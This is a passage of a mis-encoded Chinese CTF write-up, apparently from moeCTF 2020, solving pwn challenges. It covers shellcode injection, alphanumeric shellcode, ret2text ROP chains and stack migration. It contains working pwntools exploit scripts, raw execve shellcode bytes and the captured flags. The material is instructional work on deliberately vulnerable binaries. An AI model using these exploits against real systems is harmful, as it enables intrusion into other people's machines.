href="/download/moectf2020/pwn/baby_shellcode/baby_shellcode%22%E7%82%B9%E5%87%BB%E6%AD%A4%E5%A4%84%E4%B8%8B%E8%BD%BD%E5%8E%9F%E9%A2%98%22">ç‚¹å‡»ä¸‹è½½-baby_shellcode</a> </p><p>æ‹–è¿›IDAå¯ä»¥çœ‹åˆ°è¿™é“é¢˜æœ¬åœ°åªæœ‰ä¸€ä¸ªè¾“å‡ºè¯­å¥å’Œä¸€ä¸ªè¾“å…¥è¯­å¥</p><p><img src="https://i.loli.net/2020/08/01/5fahTbeGgDlwNWt.png" alt="image.png"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¨‹åºè¯»å…¥æˆ‘ä»¬çš„è¾“å…¥åç›´æ¥å°è¯•å°†æˆ‘ä»¬çš„è¾“å…¥ä½œä¸ºä»£ç æ¥æ‰§è¡Œï¼Œå› æ­¤æˆ‘ä»¬ç›´æ¥æ„é€ getshellçš„shellcodeè¾“å…¥å³å¯</p><p>ä½¿ç”¨**asm(shellcraft.sh())**å¯ä»¥ç›´æ¥è·å–ä¸€æ®µshellcode</p><p><img src="https://i.loli.net/2020/09/15/kB9NEsTiAfwXSnz.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;D0_yoU_kN0w_she11c0d3?&#125;</span><br></pre></td></tr></table></figure><h2 id="unusual-shellcode-Alphanumeric-Shellcode"><a href="#unusual-shellcode-Alphanumeric-Shellcode" class="headerlink" title="unusual shellcode - Alphanumeric Shellcode"></a>unusual shellcode - Alphanumeric Shellcode</h2><p> <a href="/download/moectf2020/pwn/unusual/unusual%22%E7%82%B9%E5%87%BB%E6%AD%A4%E5%A4%84%E4%B8%8B%E8%BD%BD%E5%8E%9F%E9%A2%98%22">ç‚¹å‡»ä¸‹è½½-unusual</a> </p><p>é¦–å…ˆæ˜¯æƒ¯ä¾‹çš„<code>checksec</code></p><p><img src="https://i.loli.net/2020/10/08/cdTow3X5p6WUAHk.png" alt="image.png"></p><p>é™¤äº†åœ°å€éšæœºåŒ–ä»¥å¤–å…¶ä»–çš„éƒ½å¼€æ»¡äº†</p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/08/10/CTInhxDcJqsORVy.png" alt="image.png"></p><p>v7æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå¹¶è¢«åˆ†é…åˆ°äº†<code>0x1000</code>å¤§å°çš„å†…å­˜ç©ºé—´</p><p>ç¨‹åºä¼šä»è¾“å…¥æµé€å­—èŠ‚è¯»å…¥æœ€å¤§4096ä¸ªå­—èŠ‚å†™å…¥åˆ°v7æ‰€æŒ‡å‘çš„ç©ºé—´ä¸Šï¼Œä¸”é™åˆ¶è¾“å…¥ä»…èƒ½ä¸ºå­—æ¯æˆ–æ•°å­—å¦åˆ™ç»ˆæ­¢è¾“å…¥</p><p>è¾“å…¥ç»“æŸåå°è¯•æ‰§è¡Œå‡½æ•°æŒ‡é’ˆv7</p><p>é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥è¾“å…¥ä¸€æ®µshellcodeå³å¯getshell</p><p>ä½†æ˜¯é™åˆ¶äº†è¾“å…¥åªèƒ½æ˜¯æ•°å­—å’Œå­—æ¯ï¼Œå¸¸è§çš„shellcodeéƒ½åŒ…å«ä¸€äº›å…¶ä»–å­—ç¬¦</p><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥å°è¯•ç™¾åº¦XD</p><p><img src="https://i.loli.net/2020/08/10/xptnlBUTFKISRsD.png" alt="image.png"></p><p>å¾—çŸ¥ä¸€ç§å«åš<strong>Alphanumeric Shellcode</strong>çš„ä¸œè¥¿www</p><p>å…·ä½“å‚è§ï¼š<a href="https://www.freebuf.com/articles/system/232280.html">https://www.freebuf.com/articles/system/232280.html</a></p><p>é¦–å…ˆä»GitHubä¸Šéšä¾¿æ‰¾ä¸€ä¸ªè½®å­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/TaQini/alpha3.git</span><br></pre></td></tr></table></figure><p>ç„¶åç¼–å†™ç”Ÿæˆæˆ‘ä»¬çš„shellcodeçš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sc.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">sc = shellcraft.sh()</span><br><span class="line"><span class="built_in">print</span> asm(sc)</span><br></pre></td></tr></table></figure><p>è¾“å‡ºé‡å®šå‘è‡³æ–‡æœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python sc.py &gt; sc</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨è½®å­ç”Ÿæˆalphanumeric shellcode</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python ./ALPHA3.py x64 ascii mixedcase rax --input=<span class="string">&quot;sc&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/10/Bg5T7zeZVOWsJ9K.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00</span><br></pre></td></tr></table></figure><p>è¿æ¥æœåŠ¡ç«¯ï¼Œå‘é€æˆ‘ä»¬çš„alphanumeric shellcodeï¼ŒæˆåŠŸgetshell</p><p><img src="https://i.loli.net/2020/08/10/b5Ru7PmDZasA1jI.png" alt="image.png"></p><p>å¾—åˆ°flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Y0u_kn3w_tH3_a1ph4num3r1C_she1lc0de!&#125;</span><br></pre></td></tr></table></figure><h2 id="ROP1-ret2text"><a href="#ROP1-ret2text" class="headerlink" title="ROP1 - ret2text"></a>ROP1 - ret2text</h2><p> <a href="/download/moectf2020/pwn/rop1/rop1%22%E7%82%B9%E5%87%BB%E6%AD%A4%E5%A4%84%E4%B8%8B%E8%BD%BD%E5%8E%9F%E9%A2%98%22">ç‚¹å‡»ä¸‹è½½-rop1</a> </p><p>ROPå³ä¸º<strong>Return-Oriented Programming â€”â€”è¿”å›å¯¼å‘ç¼–ç¨‹</strong>ï¼Œ æ˜¯ä¸€ç§å¯ä»¥ç”¨æ¥ç»•è¿‡ç°ä»£æ“ä½œç³»ç»Ÿçš„å„ç§é€šç”¨é˜²å¾¡ï¼ˆæ¯”å¦‚å†…å­˜ä¸å¯æ‰§è¡Œå’Œä»£ç ç­¾åç­‰ï¼‰çš„é«˜çº§çš„å†…å­˜æ”»å‡»æŠ€æœ¯ã€‚</p><blockquote><p>å…¶ä¸»è¦æ€æƒ³æ˜¯åœ¨<strong>æ ˆç¼“å†²åŒºæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨ç¨‹åºä¸­å·²æœ‰çš„å°ç‰‡æ®µ (gadgets) æ¥æ”¹å˜æŸäº›å¯„å­˜å™¨æˆ–è€…å˜é‡çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</strong>æ‰€è°“ gadgets å°±æ˜¯ä»¥ ret ç»“å°¾çš„æŒ‡ä»¤åºåˆ—ï¼Œé€šè¿‡è¿™äº›æŒ‡ä»¤åºåˆ—ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æŸäº›åœ°å€çš„å†…å®¹ï¼Œæ–¹ä¾¿æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚ </p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/">ctf-wifiï¼šBasic ROP</a></p></blockquote><p>é¦–å…ˆåœ¨Linuxä¸‹ä½¿ç”¨<code>checksec</code>æŒ‡ä»¤åˆ†æï¼Œå‘ç°å…¶å¼€å¯äº†<strong>æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</strong></p><p><img src="https://i.loli.net/2020/08/06/CmTilx3bQBschY8.png" alt="image.png"></p><p>å°†ç¨‹åºæ‹–å…¥IDAåˆ†æï¼Œå‘ç°å­˜åœ¨<code>gets</code>å‡½æ•°ï¼Œå¾ˆæ˜æ˜¾å­˜åœ¨æ ˆæº¢å‡º</p><p><img src="https://i.loli.net/2020/08/06/rfdg523GS6IOy7k.png" alt="image.png"></p><p>æˆ‘ä»¬å°è¯•å°†æ–­ç‚¹ä¸‹åœ¨<code>call _gets</code>ï¼Œå³<code>0x40087f</code>çš„åœ°ä»¥è®¡ç®—åç§»é‡</p><p><img src="https://i.loli.net/2020/08/06/1pKo5GdSW3Jf42u.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gdb</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">file rop1</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">b *0x40087f</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">r</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/06/oQREW8CdHIU59ai.png" alt="image.png"></p><p>ç”±<code>lea rax, [rbp-0x80]</code>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯¥å­—ç¬¦ä¸²ä¸ºåŸºäºrbpçš„ç´¢å¼•ï¼Œæ•…å…¶ç›¸å¯¹äºè¿”å›åœ°å€çš„åç§»å³ä¸º<code>0x80+8</code>ï¼Œä¹Ÿå°±æ˜¯<strong>128ä¸ªå­—èŠ‚å†åŠ ä¸Š8å­—èŠ‚çš„rbp</strong>ï¼Œä¹‹åå°±æ˜¯<strong>å‡½æ•°çš„è¿”å›åœ°å€</strong></p><p>å› æ­¤æˆ‘ä»¬æ„é€ çš„payloadåŸºç¡€æ¨¡å‹åº”å½“æ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">target_addr = p64(addr_of_target)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">128</span> + target_addr</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å°±åº”è¯¥å¼€å§‹å¯»æ‰¾éœ€è¦ç”¨çš„<strong>gadgetï¼ˆç¨‹åºå°ç‰‡æ®µï¼‰</strong>äº†</p><p>ä¸€èˆ¬æ¥è¯´åªè¦æ‰¾åˆ°<code>system(&quot;/bin/sh&quot;)</code>å°±å¯ä»¥getshelläº†</p><p>ç„¶è€Œæˆ‘ä»¬ä¸éš¾çœ‹å‡ºï¼Œç¨‹åºä¸­è™½ç„¶å­˜åœ¨ç€systemå‡½æ•°ï¼Œä½†æ˜¯å´æ˜¯<code>system(&quot;eqqie&quot;)</code>ã€‚ã€‚ã€‚</p><p><img src="https://i.loli.net/2020/08/06/ZGdgYATBi8L2fwm.png" alt="image.png"></p><p>å› æ­¤å¾ˆæ˜æ˜¾æˆ‘ä»¬ä¸èƒ½ç›´æ¥è¿”å›åˆ°è¿™ä¸ªå‡½æ•°çš„åœ°å€ä¸Š</p><p>ä½†æ˜¯è¿™ä¹Ÿå‘Šè¯‰æˆ‘ä»¬æœ‰<code>systemå‡½æ•°</code>çš„gadgetï¼Œæ¥ä¸‹æ¥åªéœ€è¦å†æ‰¾åˆ°<code>/bin/sh</code>å­—ç¬¦ä¸²å°±å¯ä»¥å‡‘å‡º<code>system(&#39;/bin/sh&#39;)</code></p><p>æˆ‘ä»¬å¾ˆå®¹æ˜“åœ¨<code>.data</code>æ®µæ‰¾åˆ°<code>&quot;/bin/sh&quot;</code></p><p><img src="https://i.loli.net/2020/08/06/8jlm6eZaWA1uMx5.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/08/06/IvTARLHcFo97XyS.png" alt="image.png"></p><p>ä¸32ä½ç¨‹åºæ‰€ä¸åŒçš„æ˜¯ï¼Œ64ä½ç¨‹åºå‚æ•°<strong>é¦–å…ˆé€šè¿‡rdi,rsi,rdx,rcx,r8,r9è¿™å…­ä¸ªå¯„å­˜å™¨è¿›è¡Œä¼ é€’</strong></p><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å…ˆåœ¨<code>rdiå¯„å­˜å™¨</code>å†…å†™å…¥<code>&quot;/bin/sh&quot;</code>çš„åœ°å€å†è°ƒç”¨systemå‡½æ•°å³å¯getshell</p><p>ä½†æ˜¯æˆ‘ä»¬ç›´æ¥æ‰¾ä¼¼ä¹æ‰¾ä¸åˆ°<code>pop rdi</code></p><p>åˆ«æ…Œwwwï¼Œåœ¨IDAå†…æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€æ®µæŒ‡ä»¤æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop r15</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/06/BgKRwnzp5yTH7l8.png" alt="image.png"></p><p>æŒ‰ä¸‹<code>D</code>å±•å¼€å˜æˆæ•°æ®</p><p><img src="https://i.loli.net/2020/08/06/XFxkV5w7uSKMmRG.png" alt="image.png"></p><p>å†æŒ‰ä¸‹<code>C</code>å˜æˆæŒ‡ä»¤</p><p><img src="https://i.loli.net/2020/08/06/MK2JW16oy3Db8FB.png" alt="image.png"></p><p>å¾—åˆ°æŒ‡ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop rdi</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>äºæ˜¯æˆ‘ä»¬å°±æˆåŠŸå¾—åˆ°äº†<strong>æ”¹å˜rdiå¯„å­˜å™¨çš„gadgetçš„åœ°å€</strong></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥æ„é€ payloadäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;rop1&#x27;</span>)<span class="comment">#p = remote(&#x27;sec.eqqie.cn&#x27;,10004)</span></span><br><span class="line"></span><br><span class="line">pop_rdi = p64(<span class="number">0x400933</span>)</span><br><span class="line">sh_addr = p64(<span class="number">0x601070</span>)</span><br><span class="line">call_sys = p64(<span class="number">0x4007df</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">136</span> + pop_rdi + sh_addr + call_sys</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿æ¥æœåŠ¡å™¨ï¼Œä½¿ç”¨æˆ‘ä»¬çš„payloadæ¥getshell</p><p><img src="https://i.loli.net/2020/08/06/yPLIicR9daTVWB8.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/08/06/1fT5rBh23v6sayX.png" alt="image.png"></p><p>å¾—åˆ°flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;67d14388-9052-4182-869c-5e5f0cdac4e5&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨ï¼šä¹Ÿå¯ä»¥ä½¿ç”¨å·¥å…·<code>ROPgadget</code>æ¥å¯»æ‰¾gadget</p><p>Linuxä¸‹ï¼Œä¸Šé¢å¯»æ‰¾gadgetçš„æ­¥éª¤ä¹Ÿå¯ä»¥å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary rop1 --string <span class="string">&#x27;/bin/sh&#x27;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/06/XOmzb8AWo92nvBi.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary rop1 --only <span class="string">&#x27;pop|ret&#x27;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/06/tLToxVk8Cz19ARP.png" alt="image.png"></p></blockquote><blockquote><p>å‚è€ƒèµ„æ–™ï¼š<a href="https://www.cnblogs.com/ichunqiu/p/9288935.html">https://www.cnblogs.com/ichunqiu/p/9288935.html</a></p></blockquote><h2 id="ROP2-ret2text"><a href="#ROP2-ret2text" class="headerlink" title="ROP2 - ret2text"></a>ROP2 - ret2text</h2><p> <a href="/download/moectf2020/pwn/rop2/rop2%22%E7%82%B9%E5%87%BB%E6%AD%A4%E5%A4%84%E4%B8%8B%E8%BD%BD%E5%8E%9F%E9%A2%98%22">ç‚¹å‡»ä¸‹è½½-rop2</a> </p><p>é¦–å…ˆä½¿ç”¨<code>checksec</code>æŒ‡ä»¤ï¼Œå‘ç°å…¶å­˜åœ¨<strong>æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</strong></p><p><img src="https://i.loli.net/2020/08/06/HDUg72BPC94AzJO.png" alt="image.png"></p><p>æ‹–è¿›IDAï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸€é¢˜å’ŒROP1åŸºæœ¬ä¸Šæ²¡æœ‰å¤ªå¤§çš„ä¸åŒï¼Œéƒ½æ˜¯ç›´æ¥å­˜åœ¨getså‡½æ•°çš„æº¢å‡ºæ¼æ´</p><p><img src="https://i.loli.net/2020/08/06/CYwqLfMRsyBxHK1.png" alt="image.png"></p><p>ä»¥åŠ<code>system</code>å‡½æ•°çš„gadgetå’Œ<code>pop rdi</code>çš„gadget</p><p><img src="https://i.loli.net/2020/08/06/tHY6GJM3NWE8jUk.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/08/06/mLMFVgjHt5DzBas.png" alt="image.png"></p><p>ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸€æ¬¡å¹¶æ²¡æœ‰ç»™æˆ‘ä»¬é¢„ç•™ä¸‹å¯ä»¥åˆ©ç”¨çš„<code>&quot;/bin/sh&quot;</code>å­—ç¬¦ä¸²</p><p><img src="https://i.loli.net/2020/08/06/BsmoxyjT8bOnvuh.png" alt="image.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦å¯ä»¥æ‰‹åŠ¨è¯»å…¥<code>/bin/sh</code>å­—ç¬¦ä¸²å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„</p><p>é¦–å…ˆå­˜åœ¨<code>gets()</code>å‡½æ•°å¯ä»¥è¯»å…¥å­—ç¬¦ä¸²</p><p><img src="https://i.loli.net/2020/08/09/vxIF8c1b4ATqtQW.png" alt="image.png"></p><p>å…¶æ¬¡æˆ‘ä»¬åœ¨IDAä¸­æŒ‰ä¸‹<code>CTRL + S</code>ï¼Œå¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸€ä¸ªå¯ä»¥ä¾›æˆ‘ä»¬è¯»å†™çš„<code>.bss</code>æ®µ</p><p><img src="https://i.loli.net/2020/08/09/hdC8S9FJGPBUbQl.png" alt="image.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å°†<code>/bin/sh</code>å­—ç¬¦ä¸²è¯»åˆ°è¿™ä¸ªæ®µä¸Šï¼Œå†å°†ä¹‹ä½œä¸º<code>system</code>å‡½æ•°çš„å‚æ•°å³å¯<code>getshell</code></p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ payloadå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;rop2&#x27;</span>)</span><br><span class="line">gets_addr = p64(e.symbols[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">sys_addr = p64(e.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">pop_rdi = p64(<span class="number">0x400933</span>)</span><br><span class="line">bss_addr = p64(<span class="number">0x601080</span>)<span class="comment">#ä¹Ÿå¯ä»¥ç”¨ e.bss() å¿«é€Ÿè·å–å¯è¯»å†™.bssæ®µåœ°å€</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">136</span> + pop_rdi + bss_addr + gets_addr + pop_rdi + bss_addr + sys_addr</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;rop2&#x27;</span>)<span class="comment">#p = remote(&#x27;sec.eqqie.cn&#x27;,10005)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿æ¥æœåŠ¡å™¨ï¼Œå‘é€æˆ‘ä»¬çš„payloadï¼Œå³å¯getshell</p><p><img src="https://i.loli.net/2020/08/09/fIoZyxE7F5biUQz.png" alt="image.png"></p><p>å¾—åˆ°flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;d44bc3cb-471b-4906-822b-ea5cb32c4acb&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Tips:</p><p>pwntoolsé‡Œçš„ELFæ¨¡å—å¯ä»¥å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿæ‰¾åˆ°ä¸€äº›éœ€è¦çš„åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#basic usage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e = ELF(<span class="string">&#x27;file_name&#x27;</span>)<span class="comment"># name of the file you&#x27;re going to pwn</span></span><br><span class="line"></span><br><span class="line">e.symbols[<span class="string">&#x27;func_name&#x27;</span>]<span class="comment"># to get the address of function-calling instruction quickly</span></span><br><span class="line"></span><br><span class="line">e.bss()<span class="comment"># to get the address of a readable and writable </span></span><br><span class="line"><span class="comment"># bss address quickly</span></span><br><span class="line"></span><br><span class="line">e.plt[<span class="string">&#x27;func_name&#x27;</span>]<span class="comment"># to get the address of function-calling instruction</span></span><br><span class="line"><span class="comment"># of function in .plt table quickly</span></span><br><span class="line"><span class="comment"># usually the same result with symbol[&#x27;f_name&#x27;]</span></span><br><span class="line">        </span><br><span class="line">e.got[<span class="string">&#x27;func_name&#x27;</span>]<span class="comment"># similar with the former one, which used to get .got table</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="baby-migration-stack-migration-ret2shellcode"><a href="#baby-migration-stack-migration-ret2shellcode" class="headerlink" title="baby migration - stack migration + ret2shellcode"></a>baby migration - stack migration + ret2shellcode</h2><p> <a href="/download/moectf2020/pwn/baby_migration/baby_migration">ç‚¹å‡»ä¸‹è½½-baby_migration</a> </p><p>é¦–å…ˆæ˜¯æƒ¯ä¾‹çš„<code>checksec</code></p><p><img src="https://i.loli.net/2020/08/24/4HjdZqlBKp1fIrG.png" alt="image.png"></p><p>å››èˆäº”å…¥ä¿æŠ¤å…¨å…³</p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/08/24/vf4jkEraNHWARhq.png" alt="image.png"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å­˜åœ¨æ ˆæº¢å‡ºï¼Œå¯ä¾›æº¢å‡ºå­—èŠ‚ä¸º<code>66-0x30=18</code>ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´åŸºæœ¬ä¸Šåªå¤Ÿè¦†ç›–rbpï¼ˆ8å­—èŠ‚ï¼‰+è¿”å›åœ°å€ï¼ˆ8å­—èŠ‚ï¼‰ï¼Œç©ºé—´ååˆ†æ‹¥æŒ¤ï¼ŒåŒæ—¶ç¨‹åºé‡Œä¹Ÿæ²¡æœ‰èƒ½å¤Ÿç›´æ¥åˆ©ç”¨çš„gadget</p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°åœ¨<code>bssæ®µ</code>æœ‰æå¤§çš„å¯è¯»å†™ç©ºé—´</p><p><img src="https://i.loli.net/2020/08/24/1Id5CqOT92ui4ZH.png" alt="image.png"></p><p>æ•…è€ƒè™‘<strong>æ ˆè¿ç§»</strong>ï¼Œå°†æ ˆè¿ç§»åˆ°bssæ®µå†æ”¾ä¸Šæˆ‘ä»¬çš„shellcode</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x30</span></span><br><span class="line">bss = <span class="number">0x404060</span></span><br><span class="line">back_to_gets = <span class="number">0x4011c8</span></span><br><span class="line"></span><br><span class="line">sc = <span class="string">b&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*offset + p64(bss+<span class="number">500</span>) + p64(back_to_gets)</span><br><span class="line">payload2 = sc + <span class="string">b&#x27;A&#x27;</span>*(offset - <span class="built_in">len</span>(sc)) + p64(bss+<span class="number">500</span>) + p64(bss+<span class="number">500</span>-offset)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./baby_migration&#x27;</span>)<span class="comment">#p = remote(&#x27;sec.arttnba3.cn&#x27;, 10002)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å³å¾—flag</p><p><img src="https://i.loli.net/2020/08/24/gY1Fxk7GERTjSBr.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;5tack_m1gr@ti0n_1s_e4sy!&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ä»¥ä¸‹å†…å®¹æ¥è‡ª<a href="https://arttnba3.cn/">arttnba3.cn</a>ï¼š</p><p>å¦‚ä½•å°†ä¸€ä¸ªæ ˆåŠ«æŒåˆ°åˆ«çš„åœ°æ–¹ï¼Ÿæ ˆè¿ç§»çš„è¿è¡ŒåŸç†ç©¶ç«Ÿæ˜¯ï¼Ÿ</p><p>åšäº†é‚£ä¹ˆå¤šçš„pwné¢˜ï¼ˆ<del>æŒ‡moeCTF2020åˆšåˆšå¼€å§‹åš</del>ï¼ˆğŸ‘ˆæŠŠè¿™ä¸ªå®¶ä¼™æ‹–å‡ºå»ğŸ”¨äº†ï¼‰ï¼‰ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“åœ¨æ„é€ æ ˆæº¢å‡ºçš„ropé“¾æ—¶ä¸ä»…è¦ç®—ä¸Šæ 